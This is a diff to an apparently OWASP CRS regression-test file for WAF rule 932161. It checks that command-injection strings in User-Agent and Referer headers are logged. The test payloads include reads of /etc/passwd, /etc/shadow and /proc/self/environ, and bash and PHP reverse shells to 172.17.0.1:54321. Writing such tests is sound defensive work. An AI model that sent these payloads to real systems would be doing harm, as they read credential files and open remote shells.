@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Franziska Bühler"
+  author: "Franziska Bühler, azurit"
   enabled: true
   name: "932161.yaml"
 tests:
@@ -15,8 +15,8 @@ tests:
               User-Agent: cat /etc/passwd
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/"
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-2
@@ -30,8 +30,8 @@ tests:
               User-Agent: /etc/shadow
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/"
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-3
@@ -45,7 +45,8 @@ tests:
               User-Agent: cat /proc/self/environ
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-4
@@ -59,8 +60,8 @@ tests:
               User-Agent: dd if=/etc/passwd of=/tmp/evil.sh bs=1 skip=22 count=9
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: '/'
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-5
@@ -74,8 +75,8 @@ tests:
               User-Agent: /bin/bash -c "sh -i>& /dev/tcp/172.17.0.1/54321 0>&1"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: '/'
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-6
@@ -89,8 +90,8 @@ tests:
               User-Agent: <?php `/bin/bash -c \'sh -i>&/dev/tcp/172.17.0.1/54321 0>&1\'`; ?>
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: '/'
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-7
@@ -101,12 +102,12 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP CRS test agent
+              User-Agent: "OWASP CRS test agent"
               Referer: cat /etc/passwd
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/"
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-8
@@ -117,12 +118,12 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP CRS test agent
+              User-Agent: "OWASP CRS test agent"
               Referer: /etc/shadow
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/"
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-9
@@ -133,11 +134,12 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP CRS test agent
+              User-Agent: "OWASP CRS test agent"
               Referer: cat /proc/self/environ
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-10
@@ -148,12 +150,12 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP CRS test agent
+              User-Agent: "OWASP CRS test agent"
               Referer: dd if=/etc/passwd of=/tmp/evil.sh bs=1 skip=22 count=9
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: '/'
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-11
@@ -164,12 +166,12 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP CRS test agent
+              User-Agent: "OWASP CRS test agent"
               Referer: /bin/bash -c "sh -i>& /dev/tcp/172.17.0.1/54321 0>&1"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: '/'
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
   - test_title: 932161-12
@@ -180,11 +182,11 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP CRS test agent
+              User-Agent: "OWASP CRS test agent"
               Referer: <?php `/bin/bash -c \'sh -i>&/dev/tcp/172.17.0.1/54321 0>&1\'`; ?>
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: '/'
-            protocol: "http"
+            uri: "/get"
+            version: "HTTP/1.1"
           output:
             log_contains: "id \"932161\""
